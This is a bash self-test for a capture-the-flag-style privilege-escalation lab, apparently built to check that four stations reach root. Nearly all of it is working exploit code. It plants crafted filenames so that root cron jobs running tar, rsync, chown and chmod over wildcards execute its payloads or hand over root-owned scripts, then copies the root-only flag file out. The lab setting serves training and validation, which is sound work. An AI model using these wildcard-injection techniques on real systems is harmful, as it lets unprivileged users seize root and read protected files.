#!/usr/bin/env bash
# Road to Root — Wildcard lab self-test. Four stations on target-wild.
# Run as labuser1 inside the container. Exit 0 means all four reached root.
# Jobs fire via cron every minute; C and D need two ticks (flip, then execute),
# so this test polls for up to ~5 minutes and reacts when the flip lands.
set -u
FLAG='R2R{'
P=/tmp/rtr_proof

echo "== identity =="
id

echo "== control: the flag must NOT be readable as $(id -un) =="
if cat /root/flag.txt 2>/dev/null; then
  echo "  [FAIL] control — flag readable without any exploit"; exit 1
else
  echo "  [PASS] control — flag is root-only"
fi

rm -f ${P}_a ${P}_b ${P}_c ${P}_d 2>/dev/null || true

echo "== arming A (tar) and B (rsync) — single-tick RCE =="
# A — tar czf ... * : a filename becomes --checkpoint-action
( cd /opt/archive \
  && printf 'cp /root/flag.txt %s_a; chmod 644 %s_a\n' "$P" "$P" > runme.sh \
  && touch -- "--checkpoint=1" \
  && touch -- "--checkpoint-action=exec=sh runme.sh" )
echo "  armed A"

# B — rsync -a * host: : a filename becomes -e <remote shell>
( cd /opt/sync \
  && printf 'cp /root/flag.txt %s_b; chmod 644 %s_b\n' "$P" "$P" > payload.sh \
  && touch -- "-e sh payload.sh" )
echo "  armed B"

echo "== arming C (chown) and D (chmod) phase 1 — plant the reference =="
# C — chown -R root:root * : --reference=ref flips process.sh to us
( cd /opt/pipeline && touch ref && touch -- "--reference=ref" )
echo "  armed C phase 1 (waiting for ownership flip on process.sh)"
# D — chmod -R 700 * : --reference=ww (0666) opens hook.sh to us
( cd /opt/conf && touch ww && chmod 666 ww && touch -- "--reference=ww" )
echo "  armed D phase 1 (waiting for mode flip on hook.sh)"

armed_c=0; armed_d=0
echo "== polling up to ~5 min for cron ticks =="
for i in $(seq 1 60); do
  # C phase 2: once process.sh is ours, drop the payload into it
  if [ "$armed_c" -eq 0 ] && [ -O /opt/pipeline/process.sh ]; then
    printf 'cp /root/flag.txt %s_c; chmod 644 %s_c\n' "$P" "$P" > /opt/pipeline/process.sh \
      && armed_c=1 && echo "  [tick $i] C: process.sh is mine — payload planted"
  fi
  # D phase 2: once hook.sh is writable by us, drop the payload into it
  if [ "$armed_d" -eq 0 ] && [ -w /opt/conf/hook.sh ]; then
    printf 'cp /root/flag.txt %s_d; chmod 644 %s_d\n' "$P" "$P" > /opt/conf/hook.sh \
      && armed_d=1 && echo "  [tick $i] D: hook.sh is writable — payload planted"
  fi
  if [ -f ${P}_a ] && [ -f ${P}_b ] && [ -f ${P}_c ] && [ -f ${P}_d ]; then
    break
  fi
  sleep 5
done

echo "== results =="
PASS=0; FAIL=0
labels_a="A  tar  --checkpoint-action"
labels_b="B  rsync  -e remote shell"
labels_c="C  chown  --reference (own root script)"
labels_d="D  chmod  --reference (open root script)"
for x in a b c d; do
  eval "label=\$labels_$x"
  if [ -f "${P}_$x" ] && grep -q "$FLAG" "${P}_$x" 2>/dev/null; then
    echo "  [PASS] $label"; PASS=$((PASS + 1))
  else
    echo "  [FAIL] $label  (expected ${P}_$x to contain $FLAG)"; FAIL=$((FAIL + 1))
  fi
done

echo "== score =="
echo "  PASS=$PASS  FAIL=$FAIL   (expected: 4 pass / 0 fail)"
if [ "$FAIL" -eq 0 ]; then
  echo "  ALL WILDCARD STATIONS REACH ROOT -- OK"; exit 0
else
  echo "  SOME PATHS FAILED"; exit 1
fi
